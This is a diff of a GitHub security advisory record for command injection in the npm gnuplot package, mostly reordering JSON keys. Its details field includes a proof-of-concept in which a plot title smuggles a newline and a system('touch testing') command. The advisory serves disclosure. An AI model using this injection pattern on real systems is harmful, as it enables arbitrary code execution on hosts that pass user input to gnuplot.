@@ -1,45 +1,45 @@
 {
-  "id": "GHSA-cfwc-xjfp-44jg",
-  "summary": "Command Injection in gnuplot",
-  "details": "All versions of `gnuplot` are vulnerable to Command Injection. The package fails to sanitize plot titles, which may allow attackers to execute arbitrary code in the system if the title value is supplied by a user. The following proof-of-concept creates a `testing` file in the current directory:\n\n```\nvar gnuplot = require('gnuplot');\n\nconst title = '\"\\nset title system(\"touch testing\")\\n#';\n\ngnuplot()\n.set('term png')\n.set('output \"out.png\"')\n.set(`title \"${title}\"`)\n.set('xrange [-10:10]')\n.set('yrange [-2:2]')\n.set('zeroaxis')\n.plot('(x/4)**2, sin(x), 1/x')\n.end();\n```\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
-  "modified": "2020-08-31T18:59:23Z",
-  "published": "2020-09-04T17:19:48Z",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-cfwc-xjfp-44jg/GHSA-cfwc-xjfp-44jg.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "gnuplot",
+        "purl": "pkg:npm/gnuplot"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0.0.0"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "database_specific": {
-    "nvd_published_at": null,
     "cwe_ids": [
       "CWE-77"
     ],
-    "severity": "CRITICAL",
     "github_reviewed": true,
-    "github_reviewed_at": "2020-08-31T18:59:23Z"
+    "github_reviewed_at": "2020-08-31T18:59:23Z",
+    "nvd_published_at": null,
+    "severity": "CRITICAL"
   },
+  "details": "All versions of `gnuplot` are vulnerable to Command Injection. The package fails to sanitize plot titles, which may allow attackers to execute arbitrary code in the system if the title value is supplied by a user. The following proof-of-concept creates a `testing` file in the current directory:\n\n```\nvar gnuplot = require('gnuplot');\n\nconst title = '\"\\nset title system(\"touch testing\")\\n#';\n\ngnuplot()\n.set('term png')\n.set('output \"out.png\"')\n.set(`title \"${title}\"`)\n.set('xrange [-10:10]')\n.set('yrange [-2:2]')\n.set('zeroaxis')\n.plot('(x/4)**2, sin(x), 1/x')\n.end();\n```\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
+  "id": "GHSA-cfwc-xjfp-44jg",
+  "modified": "2020-08-31T18:59:23Z",
+  "published": "2020-09-04T17:19:48Z",
   "references": [
     {
       "type": "WEB",
       "url": "https://www.npmjs.com/advisories/1440"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "gnuplot",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/gnuplot"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "0.0.0"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-cfwc-xjfp-44jg/GHSA-cfwc-xjfp-44jg.json"
-      }
-    }
-  ],
-  "schema_version": "1.6.0"
+  "schema_version": "1.6.0",
+  "summary": "Command Injection in gnuplot"
 }
